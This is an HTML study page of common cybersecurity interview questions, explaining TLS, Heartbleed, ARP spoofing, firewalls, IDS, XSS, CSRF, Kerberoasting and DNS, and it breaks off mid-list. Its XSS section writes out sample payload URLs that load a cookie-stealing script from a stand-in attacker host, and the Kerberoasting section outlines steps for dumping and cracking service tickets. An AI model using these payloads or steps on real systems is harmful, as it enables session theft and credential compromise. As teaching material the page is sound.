@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Common Cyber Security Interview Questions</title>
+    <meta name="description" content="Jafor&#39;s Website.">
+    <meta name="author" content='Jafor'><link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://benwick921.github.io/favicon.jpg">
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row p-0">
+        <a class="navbar-brand mr-sm-auto" href="https://benwick921.github.io">Jafor</a>
+        <div class="navbar-nav flex-row">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/resume">Resume</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/blog">Blog</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/writeups">Writeups</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/resources">Resources</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/contact">Contact</a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h1> <span style="color:#da1953">Com</span>mon Cybersecurity Interview Questions </h1>
+<p>Oct 24, 2020</p>
+<p><span style="color:#da1953"><strong>DISCLAIMER: Informations are taken from varous resources such as Wikipedia, Forum, Youtube, University courses and many more. The page is frequently updated.</strong></span></p>
+<hr>
+<h2> <span style="color:#da1953">Ind</span>ex </h2>
+<ul>
+<li><a href="#TLS">TLS (Transport Layer Security)</a></li>
+<li><a href="#DIGCERT">Digital Certificates</a></li>
+<li><a href="#DHCP">DHCP Protocol</a></li>
+<li><a href="#ARP">ARP Protocol</a></li>
+<li><a href="#FIREWALL">Firewall</a></li>
+<li><a href="#IDS">IDS (Intrusion Detection System)</a></li>
+<li><a href="#XSS">XSS (Corss Site Scripting)</a></li>
+<li><a href="#ACTDIR">Active Directory</a></li>
+<li><a href="#SUBNET">Subnetting and Calculations</a></li>
+<li><a href="#DNS">DNS</a></li>
+<li><a href="#QNA">Question and Answer</a></li>
+</ul>
+<hr>
+<h2 id=TLS> <span style="color:#da1953">TLS</span> (Transport Layer Security) </h2>
+<h3 id="introduction">Introduction</h3>
+<p>The protocols find widespread use in applications such as web browsing, email, instant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between their servers and web browsers.</p>
+<p>The TLS protocol aims primarily to provide privacy and data integrity between two or more communicating computer applications. When secured by TLS, connections between a client and a server should have one or more of the following properties:</p>
+<ul>
+<li>The connection is private (or secure) because symmetric cryptography is used to encrypt the data transmitted. The keys for this symmetric encryption are generated uniquely for each connection and are based on a shared secret that was negotiated at the start of the session (TLS handshake). The server and client negotiate the details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted. The negotiation of a shared secret is both secure the negotiated secret is unavailable to eavesdroppers and cannot be obtained, even by an attacker who places themselves in the middle of the connection and reliable (no attacker can modify the communications during the negotiation without being detected).</li>
+<li>The identity of the communicating parties can be <em>authenticated</em> using public-key cryptography. This authentication can be made optional, but is generally required for at least one of the parties (typically the server).</li>
+<li>The connection is <em>reliable</em> because each message transmitted includes a message integrity check using a message authentication code to prevent undetected loss or alteration of the data during transmission.</li>
+<li>The TLS protocol comprises two layers: the TLS record and the TLS handshake protocols. TLS work in the application layer of TCP/IP model.</li>
+</ul>
+<p>The TLS protocol comprises two layers: the TLS record and the TLS handshake protocols. TLS work in the application layer of TCP/IP model.</p>
+<h3 id="digital-certificates">Digital Certificates</h3>
+<p>A digital certificate certifies the ownership of a public key by the named subject of the certificate, and indicates certain expected usages of that key. This allows others (relying parties) to rely upon signatures or on assertions made by the private key that corresponds to the certified public key.</p>
+<p>TLS typically relies on a set of trusted third-party certificate authorities to establish the authenticity of certificates.</p>
+<h3 id="tls-handshake">TLS Handshake</h3>
+<p>Step 1
+<img src="/interviewquestions/tls/step1.jpg" alt="step 1"></p>
+<p>The client sends its highest version of TLS, the available cryptographic algorithm and the data compression method that wants to use.</p>
+<p>Step2
+<img src="/interviewquestions/tls/step2.jpg" alt="step 2"></p>
+<p>The server chooses the highest cryptographic protocol available from the list provided by the client, its session ID and its digital certificate with which the client can encrypt a shared secret key for the symmetric cryptography.</p>
+<p>Step 3
+<img src="/interviewquestions/tls/step3.jpg" alt="step 3"></p>
+<p>The client verifies the authenticity of the certificate with the Certificate Authority.</p>
+<p>Step 4
+<img src="/interviewquestions/tls/step4.jpg" alt="step 4"></p>
+<p>In this way, only the Server can decrypt the secret key which will be used for future communications and data transfer.</p>
+<p>Step 5
+<img src="/interviewquestions/tls/step5.jpg" alt="step 5"></p>
+<p>The client is indication that his part of handshake is complete.</p>
+<p>Step 6
+<img src="/interviewquestions/tls/step6.jpg" alt="step 6"></p>
+<p>The server is indicating that his part of handshake is complete.</p>
+<p>Step 7
+<img src="/interviewquestions/tls/step7.jpg" alt="step 7"></p>
+<p>Now the client and server can exchange messages that are symmetrically encrypted.</p>
+<h3 id="heartbleed">Heartbleed</h3>
+<p>Heartbeat is an echo functionality in SSL (older version of TLS) where either side (client or server) requests that a number of bytes of data that it sends to the other side be echoed back. Typically a text string, along with the payload&rsquo;s length as a 16-bit integer. The receiving computer then must send exactly the same payload back to the sender. The idea appears to be that this can be used as a keep-alive feature, with the echo functionality presumably meant to allow verifying that both ends continue to correctly handle encryption and decryption.</p>
+<p>The affected versions of OpenSSL allocate a memory buffer for the message to be returned based on the length field in the requesting message, without regard to the actual size of that message&rsquo;s payload. Because of this failure to do proper bounds checking, the message returned consists of the payload, possibly followed by whatever else happened to be in the allocated memory buffer.</p>
+<p>Heartbleed is therefore exploited by sending a malformed heartbeat request with a small payload and large length field to the vulnerable party (usually a server) in order to elicit the victim&rsquo;s response, permitting attackers to read up to 64 kilobytes of the victim&rsquo;s memory that was likely to have been used previously by OpenSSL. Where a Heartbeat Request might ask a party to &ldquo;send back the four-letter word &lsquo;bird&rsquo;&rdquo;, resulting in a response of &ldquo;bird&rdquo;, a &ldquo;Heartbleed Request&rdquo; (a malicious heartbeat request) of &ldquo;send back the 500-letter word &lsquo;bird&rsquo;&rdquo; would cause the victim to return &ldquo;bird&rdquo; followed by whatever 496 subsequent characters the victim happened to have in active memory.</p>
+<p><img src="/interviewquestions/heartbleed/heartbleedexample.svg" alt="Heartbleed"></p>
+<hr>
+<h2 id=DIGCERT> <span style="color:#da1953">Dig</span>ital Certificates </h2>
+<h3 id="introduction-1">Introduction</h3>
+<p>In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. A CA acts as a trusted third party, trusted both by the subject (owner) of the certificate and by the party relying upon the certificate.</p>
+<p>In cryptography, a public key certificate, also known as a digital certificate or identity certificate, is an electronic document used to prove the ownership of a public key. The certificate includes information about the key, information about the identity of its owner (called the subject), and the digital signature of an entity that has verified the certificate&rsquo;s contents (called the issuer). If the signature is valid, and the software examining the certificate trusts the issuer, then it can use that key to communicate securely with the certificate&rsquo;s subject. In Transport Layer Security (TLS) a certificate&rsquo;s subject is typically a computer or other device, though TLS certificates may identify organizations or individuals in addition to their core role in identifying devices. TLS is notable for being a part of HTTPS, a protocol for securely browsing the web.</p>
+<p>In a typical public-key infrastructure (PKI) scheme, the certificate issuer is a certificate authority (CA), usually a company that charges customers to issue certificates for them. By contrast, in a web of trust scheme, individuals sign each other&rsquo;s keys directly, in a format that performs a similar function to a public key certificate.</p>
+<p><img src="/interviewquestions/digitalcertificate/certificatehierarchy.jpg" alt="Digital certificate hierarchy"></p>
+<hr>
+<h2 id=DHCP> <span style="color:#da1953">DHC</span>P Protocol </h2>
+<h3 id="introduction-2">Introduction</h3>
+<p>The Dynamic Host Configuration Protocol (DHCP) is a network management protocol used on Internet Protocol (IP) networks whereby a DHCP server dynamically assigns an IP address and other network configuration parameters to each device on a network so they can communicate with other IP networks. A DHCP server enables computers to request IP addresses and networking parameters automatically from the Internet service provider (ISP), reducing the need for a network administrator or a user to manually assign IP addresses to all network devices. In the absence of a DHCP server, a computer or other device on the network needs to be manually assigned an IP address, or to assign itself an APIPA address, which will not enable it to communicate outside its local subnet.</p>
+<p>DHCP can be implemented on networks ranging in size from home networks to large campus networks and regional Internet service provider networks. A router or a residential gateway can be enabled to act as a DHCP server.</p>
+<h3 id="overview">Overview</h3>
+<p>DHCP operates based on the client–server model. When a computer or other device connects to a network, the DHCP client software sends a DHCP broadcast query requesting the necessary information. Any DHCP server on the network may service the request. The DHCP server manages a pool of IP addresses and information about client configuration parameters such as default gateway, domain name, the name servers, and time servers. On receiving a DHCP request, the DHCP server may respond with specific information for each client, as previously configured by an  administrator, or with a specific address and any other information valid for the entire network and for the time period for which the allocation (lease) is valid. A DHCP client typically queries for this information immediately after booting, and periodically thereafter before the expiration of the information. When a DHCP client refreshes an assignment, it initially requests the same parameter values, but the DHCP server may assign a new address based on the assignment policies set by administrators.</p>
+<p>Depending on implementation, the DHCP server may have three methods of allocating IP addresses:</p>
+<ul>
+<li>Dynamic allocation: A network administrator reserves a range of IP addresses for DHCP, and each DHCP client on the LAN is configured to request an IP address from the DHCP server during network initialization. The request-and-grant process uses a lease concept with a controllable time period, allowing the DHCP server to reclaim and then reallocate IP addresses that are not renewed.</li>
+<li>Automatic allocation: The DHCP server permanently assigns an IP address to a requesting client from the range defined by the administrator. This is like dynamic allocation, but the DHCP server keeps a table of past IP address assignments, so that it can preferentially assign to a client the same IP address that the client previously had.</li>
+<li>Manual Allocation: Also commonly called static allocation and reservations. The DHCP server issues a private IP address dependent upon each client&rsquo;s client id (or, traditionally, the client MAC address), based on a predefined mapping by the administrator. If no match for the client&rsquo;s client ID (if provided) or MAC address (if no client id is provided) is found, the server may or may not optionally fall back to either Dynamic or Automatic allocation.</li>
+</ul>
+<p>DHCP is used for Internet Protocol version 4 (IPv4) and IPv6.</p>
+<h3 id="operations">Operations</h3>
+<p>Step 1
+<img src="/interviewquestions/dhcp/step1.jpg" alt="Step 1"></p>
+<p>When client boots up it broadcast a DHCPDISCOVER message looking for a DHCP server note dstIP address.</p>
+<p>Step 2
+<img src="/interviewquestions/dhcp/step2.jpg" alt="Step 2"></p>
+<p>DHCPOFFER is a broadcast UDP packet and it replies with network configuration such as IP, lease time, DNS, subnet mask and default gateway, of course you can renew the lease when expired.</p>
+<p>Step 3
+<img src="/interviewquestions/dhcp/step3.jpg" alt="Step 3"></p>
+<p>DHCPREQUEST says that the client accepts the configurations sent by the Server.</p>
+<p>Step 4
+<img src="/interviewquestions/dhcp/step4.jpg" alt="Step 4"></p>
+<p>It is an acknowledgement packet to confirm that the server will registers client’s information.</p>
+<hr>
+<h2 id=ARP> <span style="color:#da1953">ARP</span> Protocol </h2>
+<h3 id="introduction-3">Introduction</h3>
+<p>The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as a MAC address.</p>
+<p>Whenever a device needs to communicate with another device in a Local Area Network (LAN) it needs the MAC address for that device and devices use ARP protocol to acquire the MAC address for that device.</p>
+<p>An IP address is used to locate a device on a network and the MAC address is what identify the actual device.</p>
+<h3 id="operating-scope">Operating Scope</h3>
+<p>The Address Resolution Protocol is a request-response protocol whose messages are encapsulated by a link layer protocol. It is communicated within the boundaries of a single network, never routed across internetworking nodes.</p>
+<h3 id="arp-requestresponse">Arp Request/Response</h3>
+<p>An ARP probe is an ARP request broadcasted in to the LAN (also to the router) in search of the MAC address of a given IP and the host having the requested IP will send a response containing its MAC.</p>
+<h3 id="operations-1">Operations</h3>
+<p>Step 1
+<img src="/interviewquestions/arp/step1.jpg" alt="Step 1"></p>
+<p>The cliet sends a broadcast message because the destination MAC address is a broadcast address, simply saying anyone with IP address <em>192.168.1.50</em> if you hear me would you please give your packages, and here is my IP address and MAC address. The other devices will discard the ARP packet silently.</p>
+<p>Step 2
+<img src="/interviewquestions/arp/step2.jpg" alt="Step 2"></p>
+<p>When the server hear the message, it sends a unicast message to the client because the detination IP address and MAC address belong to the client.</p>
+<p>Step 3
+<img src="/interviewquestions/arp/step3.jpg" alt="Step 3"></p>
+<p>The client gets the server&rsquo;s MAC address and can sends the server a request. At the same time the client updates ARP cache tablesfor the future reference.</p>
+<h3 id="arp-spoofing">ARP Spoofing</h3>
+<p>ARP spoofing is a technique that allows an attacker to craft a &ldquo;fake&rdquo; ARP packet that looks like it came from a different source, or has a fake MAC address in it.</p>
+<h3 id="arp-poisoning">ARP Poisoning</h3>
+<p>An attacker uses the process of ARP spoofing to &ldquo;poison&rdquo; a victim&rsquo;s ARP table, so that it contains incorrect or altered IP-to-MAC address mappings for various attacks, such as a man-in-the-middle attack.</p>
+<p>In computer networking, ARP cache poisoning, performend on a switch, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network. Generally, the aim is to associate the attacker&rsquo;s MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead.</p>
+<p><img src="/interviewquestions/arp/arpspoofing.jpg" alt="ARPSpoofing"></p>
+<hr>
+<h2 id=FIREWALL> <span style="color:#da1953">Fir</span>ewall </h2>
+<h3 id="network-layer-firewall-or-packet-filters">Network Layer Firewall or Packet Filters</h3>
+<p>Network layer firewalls, also called packet filters, operate at a relatively low level of the TCP/IP stack, blocking packets unless they match the established rule set. The firewall administrator may define the rules; or default rules may apply.</p>
+<p>Network layer firewalls generally fall into two sub-categories, stateful and stateless.</p>
+<p>A stateful firewall is a network firewall that tracks the operating state and characteristics of network connections traversing it. The firewall is configured to distinguish legitimate network packets for different types of connections. Only packets matching a known active connection are allowed to pass the firewall. In contrast a stateless firewall does not take context into account when determining whether to allow or block packets.</p>
+<p>There are other type of filters such as Application-Layer Firewall that filter preprocesses packets depending on the source/destination application, Proxies may act as a firewall by responding to input packets (connection requests, for example) in the manner of an application, while blocking other packets, Network Address Translation (NAT) may hide the true address of computer which is connected to the network.</p>
+<ul>
+<li>A firewall restrict access from outside</li>
+<li>Prevent attackers from getting too close</li>
+<li>Restrict people from leaving</li>
+</ul>
+<h3 id="packet-filters-stateless-firewall">Packet filters (stateless firewall)</h3>
+<ul>
+<li>Drop packets based on their source or destination addresses or port numbers or flags</li>
+<li>No context, only contents</li>
+<li>Can operate on
+<ul>
+<li>Incoming interface</li>
+<li>Outgoing interface</li>
+<li>Both</li>
+</ul>
+</li>
+<li>Check packets with fake IP addresses:
+<ul>
+<li>From outside (“ingress filtering”)</li>
+<li>From inside (“egress filtering”)</li>
+</ul>
+</li>
+</ul>
+<h3 id="problems-with-packet-filters">Problems with Packet Filters</h3>
+<ul>
+<li>Payload of TCP packet is not inspected.
+<ul>
+<li>No protection against attacks based on upper-layer vulnerabilities.</li>
+</ul>
+</li>
+<li>Limited logging ability (restricted to the few parameters used by the filter).</li>
+<li>No authentication facilities.</li>
+<li>Susceptible to attacks based on vulnerabilities in various implementations of TCP and/or IP.</li>
+</ul>
+<h3 id="stateful-packet-inspection">Stateful packet inspection</h3>
+<ul>
+<li>Stateful Inspection Firewalls (or Dynamic Packet Filters) can keep track of established connections.</li>
+<li>Can drop packets based on their source or destination IP addresses, port numbers and possibly TCP flags.
+<ul>
+<li>Solve one major problem of simple packet filters, since they can check that incoming traffic for a high-numbered port is a genuine response to a previous outgoing request to set up a connection.</li>
+</ul>
+</li>
+</ul>
+<p><img src="/interviewquestions/firewall/dynamicpacketfilter.jpg" alt="Dynamic packet filter"></p>
+<h3 id="common-firewall-weaknesses">Common firewall weaknesses</h3>
+<ul>
+<li>No content inspection causes the problems.
+<ul>
+<li>Software weakness (e.g. buffer overflow, and SQL injection exploits).</li>
+<li>Protocol weakness (WEP in 802.11).</li>
+</ul>
+</li>
+<li>No defense against.
+<ul>
+<li>Denial of service.</li>
+<li>Insider attacks.</li>
+</ul>
+</li>
+<li>Firewall failure has to be prevented.
+<ul>
+<li>Firewall cluster for redundancy.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id=IDS> <span style="color:#da1953">IDS</span> (Intrusion Detection System) </h2>
+<p>An intrusion detection system (IDS) is a device or software application that monitors a network or systems for malicious activity.</p>
+<p>An Intrusion Detection System (IDS) aims at detecting the presence of intruders before serious damage is done.</p>
+<p>The ultimate purpose of an intruder could be to:</p>
+<ul>
+<li>Prevent the legitimate users from using the system.</li>
+<li>Reveal confidential information.</li>
+<li>Use the system as a stepping stone to attack other systems.</li>
+</ul>
+<p>Second generation IDS are IPS, Intrusion Prevention Systems, also produce responses to suspicious activity, for example, by modifying firewall rules or blocking switches ports.</p>
+<p><img src="/interviewquestions/ids/ids.jpg" alt="Ids"></p>
+<p>An IDS (passive detection) can only detect and rise alarm of malicious activities and report it to the network administrator or SIEM.</p>
+<h3 id="types-of-ids">Types of IDS</h3>
+<ul>
+<li>Host-based (HIDS):
+<ul>
+<li>Monitors events in a single host to detect suspicious activity.</li>
+<li>Typically deployed on critical hosts offering public services.</li>
+<li>Advantage: better visibility into behavior of individual applications running on the host.</li>
+</ul>
+</li>
+<li>Network-based (NIDS):
+<ul>
+<li>Analyses network, transport and application protocol activity.</li>
+<li>Often placed behind a router or firewall that is the entrance of a critical asset.</li>
+<li>Advantage: single NIDS/IPS can protect many hosts and detect global patterns.</li>
+</ul>
+</li>
+<li>Wireless (WIDS):
+<ul>
+<li>Analyses wireless networking protocol activity (not T- or A-layers).</li>
+<li>Typically deployed in or near an organization&rsquo;s wireless network.</li>
+</ul>
+</li>
+</ul>
+<h3 id="ids-detection-approach">IDS detection approach</h3>
+<ul>
+<li>Behavior-based (anomaly detection):
+<ul>
+<li>Define behavioral characteristics of normal behavior.</li>
+<li>Compare actual behavior with these. If there are significant differences, raise an alarm.</li>
+<li>Difficult to define all possible normal behavior. New activities often give &ldquo;false positives&rdquo; (i.e. normal behavior classified as intrusion).</li>
+</ul>
+</li>
+<li>Signature based (misuse detection):
+<ul>
+<li>Define characteristics of various types of abnormal activities.</li>
+<li>Compare actual behavior with these. If any of them match, raise alarm!.</li>
+<li>Difficult to produce a complete catalog of abnormal activities.
+<ul>
+<li>If any are missing, there will be &ldquo;false negatives&rdquo; (i.e. undetected intrusions)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="signature-based-ids">Signature-based IDS</h3>
+<ul>
+<li>Starts from the idea that intruders/attacks may have a characteristic appearance which makes it possible to identify them.</li>
+<li>The idea is to screen the PAYLOADS of the packets looking for specific patterns -&gt; no security signatures.</li>
+<li>Suppliers of IDSs maintain huge databases of signatures (code or data fragments) which characterize various classes of intruder.</li>
+<li>Rapid recognition involves searching for matches for one or more of the known signatures from a collection of many thousands of signatures</li>
+</ul>
+<h3 id="signature-based-ids-principles">Signature-based IDS principles</h3>
+<ul>
+<li>A packet sniffer on steroids.</li>
+<li>Passive capturer of the packets in a LAN, it can bring to bear on the packets some fairly complex logic to decide whether an intrusion has taken place
+<ul>
+<li>SNORT is one of the best-known intrusion detectors
+<ul>
+<li>Easy-to-learn and easy-to-use rule language for intrusion detection</li>
+<li>The rules are stored in /etc/snort/rules directory</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Con: can&rsquo;t inspect encrypted traffic (VPNs, SSL)</li>
+<li>Con: not all attacks arrive from the network</li>
+<li>Con: record and process huge amount of traffic</li>
+</ul>
+<hr>
+<h2 id=XSS> <span style="color:#da1953">XSS</span> (Cross Site Scripting) </h2>
+<h3 id="introduction-4">Introduction</h3>
+<p>It is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.</p>
+<h3 id="examples">Examples</h3>
+<ul>
+<li>
+<p>Reflected: In a vulnerable website e query can be crafted in order to execute a custom script (<code>http://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;</code>) or encode the ASCII characters with percent-encoding, such as (<code>http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</code>).
+If this link is sent to the victim he/she will execute the script <em>authstealer.js</em> and any operation written there can be executed such as stealing authentication cookies and log in as him/her.</p>
+</li>
+<li>
+<p>Stored: In this case the script is put in a text are or wherever a user can write such as comments of posts, review etc&hellip;
+If the site is vulnerable in the text are HTML commands can be execute so a proper XSS exploit can be crafted (<code>I love the puppies in this story! They're so cute!&lt;script src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;</code>). If the link is clicked the script <em>authstealer.js</em> will run and operations will be executed.</p>
+</li>
+</ul>
+<hr>
+<h2 id=CSRF> <span style="color:#da1953">CSR</span>F</h2>
+<p>CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim.</p>
+<p>CSRF attacks target functionality that causes a state change on the server, such as changing the victim’s email address or password, or purchasing something.</p>
+<p>It’s sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called “stored CSRF flaws”. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the likelihood is increased because the victim is more likely to view the page containing the attack than some random page on the Internet. The likelihood is also increased because the victim is sure to be authenticated to the site already.</p>
+<hr>
+<h2 id=ACTDIR> <span style="color:#da1953">Act</span>ive Directory </h2>
+<h3 id="introduction-5">Introduction</h3>
+<p>Active Directory (AD) is a directory service developed by Microsoft. A server running Active Directory Domain Service (AD DS) role is called a domain controller. It authenticates and authorizes all users and computers in a Windows domain type network—assigning and enforcing security policies for all computers and installing or updating software. For example, when a user logs into a computer that is part of a Windows domain, Active Directory checks the submitted password and determines whether the user is a system administrator or normal user. Also, it allows management and storage of information and provides authentication and authorization mechanisms.</p>
+<h3 id="services">Services</h3>
+<p>Active Directory Services consist of multiple directory services.</p>
+<h4 id="domain-service">Domain Service</h4>
+<p>Active Directory Domain Services (AD DS) is the foundation stone of every Windows domain network. It stores information about members of the domain, including devices and users, verifies their credentials and defines their access rights. The server running this service is called a domain controller. A domain controller is contacted when a user logs into a device, accesses another device across the network, or runs a line-of-business Metro-style app sideloaded into a device.</p>
+<p>Other Active Directory services (excluding LDS, as described below) as well as most of Microsoft server technologies rely on or use Domain Services; examples include Group Policy, Encrypting File System, BitLocker, Domain Name Services, Remote Desktop Services, Exchange Server and SharePoint Server.</p>
+<h3 id="common-attacks">Common Attacks</h3>
+<h4 id="kerberosting">Kerberosting</h4>
+<p>This attack can be carried out by any user on a domain—not just administrators. It is an “offline” attack that doesn&rsquo;t require any packets be sent to the targeted service—traffic that would be logged and quite possibly trigger alerts. At its core, Kerberoasting is a password-cracking attack in which credentials are stolen from memory and cracked offline.</p>
+<ul>
+<li>Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking.</li>
+<li>Kerberoasting is a common, pervasive attack that exploits a combination of weak encryption and poor service account password hygiene.</li>
+<li>Kerberoasting is effective because an attacker does not require domain administrator credentials to pull off this attack and can extract service account credential hashes without sending packets to the target.</li>
+</ul>
+<p>Kerberoasting enables privilege escalation and lateral network movement. Kerberoasting is used by attackers once they are established inside an enterprise network and have begun reconnaissance for lateral movement. The technique allows the attackers, as valid domain users, to request a Kerberos service ticket for any service, capture that ticket granting service (TGS) ticket from memory, and then attempt to crack the service credential hash offline using any number of password-cracking tools, such as Hashcat, John the Ripper, and others.</p>
+<p>Steps to compromise service with SPN:</p>
+<ul>
+<li>Get SPN (Service Principle Name) via script <code>GetUserSPNs.py</code>.</li>
+<li>Choose a SPN and request a ticket with the choosen SPN, susually the choosen SPN should be Administrator in order to priviledge escalete.</li>
+<li>Use Mimikatz to dump the ticket from memory, the ticket will be encrypted with NTLM hash of the choosen SPN account password.</li>
+<li>Crack the ticket offline with any tool.</li>
+</ul>
+<p>or GetUserSPNs from Imapcket Suite can  be used to list and retrive the service ticket and then crack it offline (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting">tutorial</a>).</p>
+<hr>
+<h2 id=SUBNET> <span style="color:#da1953">Sub</span>netting and calculations</h2>
+<p>Address:   192.168.0.1          11000000.10101000.00000000 .00000001<br>
+Netmask:   255.255.255.0 = 24   11111111.11111111.11111111 .00000000<br>
+Wildcard:  0.0.0.255           00000000.00000000.00000000 .11111111<br>
+=&gt;<br>
+Network:   192.168.0.0/24       11000000.10101000.00000000 .00000000 (Class C)<br>
+Broadcast: 192.168.0.255      11000000.10101000.00000000 .11111111<br>
+HostMin:   192.168.0.1          11000000.10101000.00000000 .00000001<br>
+HostMax:   192.168.0.254        11000000.10101000.00000000 .11111110<br>
+Hosts/Net: 254                (Private Internet)<br></p>
+<p>192.168.0.0 identifies the whole network.<br>
+192.168.0.255 broadcast address.<br>
+Assignable IPs goes from 192.168.0.1 to 192.168.0.254<br></p>
+<p>&ldquo;Explain how to calculate subnet&rdquo;</p>
+<hr>
+<h2 id=DNS> <span style="color:#da1953">DNS</span></h2>
+<p>The Domain Name System (DNS) is a hierarchical and decentralized naming system for computers, services, or other resources connected to the Internet or a private network. It translates domain names into IP addresses needed for locating and identifying computer services and devices.</p>
+<h3 id="name-server">Name Server</h3>
+<p>he Domain Name System is maintained by a distributed database system, which uses the client–server model. The nodes of this database are the name servers. Each domain has at least one authoritative DNS server that publishes information about that domain and the name servers of any domains subordinate to it.</p>
+<p><img src="/interviewquestions/dns/domainnamesystem.png" alt="DomainNameSystem"></p>
+<h3 id="authoritative-name-server">Authoritative Name Server</h3>
+<p>An authoritative name server is a name server that only gives answers to DNS queries ((NS) records) from data that has been configured by an original source, for example, the domain administrator or by dynamic DNS methods.</p>
+<p>An authoritative name server can either be a primary server or a secondary server. A primary server is a server that stores the original copies of all zone records. A secondary server uses a special automatic updating mechanism in the DNS protocol in communication with its primary to maintain an identical copy of the primary records.</p>
+<p><img src="/interviewquestions/dns/dnshierarchy.jpg" alt="DNSHierarchy"></p>
+<h3 id="address-resolution-mechanism">Address Resolution Mechanism</h3>
+<h4 id="iterative-address-relosution">Iterative Address Relosution</h4>
+<p>In Iterative DNS Query, when a DNS Client asks the DNS server for name resolution, the DNS Server provides the best answer it has. If the DNS Server doesn&rsquo;t know the answer to the DNS Query from Client, the answer can be a reference to another lower level DNS Server also. This lower level DNS Server is delegated at the higher level DNS Server to be Authoritative for the DNS namespace which the DNS Query is related with. Once the DNS Client get the referral from higher level DNS Server, it can then send a DNS Query to the lower level DNS server, got as referral.</p>
+<p><img src="/interviewquestions/dns/iterativequery.png" alt="InterativeQuery"></p>
+<h4 id="recursive-address-resolution">Recursive Address Resolution</h4>
+<p>A recursive query is a kind of query, in which the DNS server, who received your query will do all the job of fetching the answer, and giving it back to you. During this process, the DNS server might also query other DNS server&rsquo;s in the internet on your behalf, for the answer.</p>
+<p><img src="/interviewquestions/dns/recursivequery.jpg" alt="RecursiveQuery"></p>
+<hr>
+<h2 id=QNA> <span style="color:#da1953">Que</span>stion and Answer</h2>
+<h3 id="difference-between-xss-and-csrf">Difference between XSS and CSRF</h3>
+<p>Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user.
+Cross-site request forgery (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to.</p>
+<p>The consequences of XSS vulnerabilities are generally more serious than for CSRF vulnerabilities:</p>
+<ul>
+<li>CSRF often only applies to a subset of actions that a user is able to perform.  Conversely, a successful XSS exploit can normally induce a user to perform any action that the user is able to perform, regardless of the functionality in which the vulnerability arises.</li>
+<li>CSRF can be described as a &ldquo;one-way&rdquo; vulnerability, in that while an attacker can induce the victim to issue an HTTP request, they cannot retrieve the response from that request. Conversely, XSS is &ldquo;two-way&rdquo;, in that the attacker&rsquo;s injected script can issue arbitrary requests, read the responses, and exfiltrate data to an external domain of the attacker&rsquo;s choosing.</li>
+</ul>
+<h3 id="can-csrf-tokens-prevent-xss-attacks">Can CSRF tokens prevent XSS attacks?</h3>
+<p>Some XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple reflected XSS vulnerability that can be trivially exploited like this: <code>https://insecure-website.com/status?message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</code></p>
+<p>Now, suppose that the vulnerable function includes a CSRF token:</p>
+<p><code>https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&amp;message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</code></p>
+<p>Assuming that the server properly validates the CSRF token, and rejects requests without a valid token, then the token does prevent exploitation of the XSS vulnerability. The clue here is in the name: &ldquo;cross-site scripting&rdquo;, at least in its reflected form, involves a cross-site request. By preventing an attacker from forging a cross-site request, the application prevents trivial exploitation of the XSS vulnerability.</p>
+<h3 id="what-are-the-phases-of-a-penetration-test">What are the phases of a penetration test?</h3>
+<ul>
